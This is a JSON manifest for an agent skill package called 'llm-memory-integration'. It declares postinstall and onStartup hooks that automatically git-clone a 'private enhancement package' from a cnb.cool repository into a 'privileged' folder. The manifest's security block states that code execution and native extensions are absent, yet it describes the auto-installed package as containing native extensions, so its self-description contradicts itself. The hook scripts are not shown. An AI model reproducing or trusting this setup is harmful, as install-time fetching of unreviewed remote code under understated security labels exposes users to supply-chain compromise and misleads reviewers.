{
  "name": "llm-memory-integration",
  "version": "8.0.1",
  "description": "LLM Memory Integration - 接口层 + 自动化钩子。安装后自动从 CNB 仓库拉取私有增强包。",
  "license": "MIT-0",
  "author": "xkzs2007",
  "homepage": "https://clawhub.ai/skill/llm-memory-integration",
  "keywords": ["memory", "search", "interface", "hooks", "auto-install"],
  "requiredBinaries": ["python3", "git"],
  "requiredEnvVars": [],
  "optionalEnvVars": [],
  "requiredPythonPackages": [],
  "networkRequired": true,
  "networkEndpoints": ["https://cnb.cool/llm-memory-integrat/llm"],
  "primaryCredential": null,
  "requiredConfigPaths": [
    "~/.openclaw/memory-tdai",
    "~/.openclaw/workspace/skills/llm-memory-integration/src/privileged"
  ],
  "requirements": {
    "binaries": ["python3", "git"],
    "envVars": {
      "required": [],
      "optional": []
    },
    "pythonPackages": {
      "required": [],
      "optional": []
    },
    "network": true,
    "networkEndpoints": ["https://cnb.cool/llm-memory-integrat/llm"],
    "filesystem": {
      "read": ["~/.openclaw/memory-tdai"],
      "write": [
        "~/.openclaw/memory-tdai",
        "~/.openclaw/workspace/skills/llm-memory-integration/src/privileged"
      ]
    },
    "capabilities": ["subprocess_calls", "network_access"]
  },
  "security": {
    "codeExecution": false,
    "nativeExtensions": false,
    "subprocessCalls": true,
    "subprocessDescription": "钩子会调用 git clone 命令",
    "networkAccess": true,
    "networkDescription": "钩子会访问 cnb.cool 下载私有包",
    "systemReads": false
  },
  "hooks": {
    "postinstall": "hooks/postinstall.py",
    "onStartup": "hooks/onStartup.py",
    "description": "生命周期钩子，自动从 CNB 拉取私有包"
  },
  "privilegedPackage": {
    "url": "https://cnb.cool/llm-memory-integrat/llm",
    "architectures": ["x64", "arm64"],
    "autoInstall": true,
    "description": "私有增强包，包含高性能实现、原生扩展、API 集成"
  }
}
